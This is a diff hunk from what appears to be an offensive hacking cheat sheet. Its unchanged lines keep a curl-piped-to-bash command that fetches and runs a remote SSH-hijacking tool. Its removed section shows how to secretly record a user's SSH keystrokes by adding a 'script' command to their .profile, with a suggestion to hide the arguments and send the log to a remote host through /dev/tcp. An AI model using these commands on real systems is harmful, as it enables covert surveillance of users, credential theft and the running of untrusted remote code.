@@ -771,16 +771,6 @@ The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-i
 bash -c "$(curl -fsSL ssh-it.thc.org/x)"
 ```
 
-<a id="ssswos-anchor"></a>
-**9.ii Sniff a user's SSH session without strace**
-
-The tool 'script' has been part of Unix for decades. Add 'script' to the user's .profile. The user's keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:
-```sh
-echo 'exec script -qc /bin/bash ~/.ssh-log.txt' >>~/.profile
-```
-Consider using [zap-args](#hya-anchor) to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.
-
-
 <a id="hlc-anchor"></a>
 **10.i. How to survive high latency connections**
 
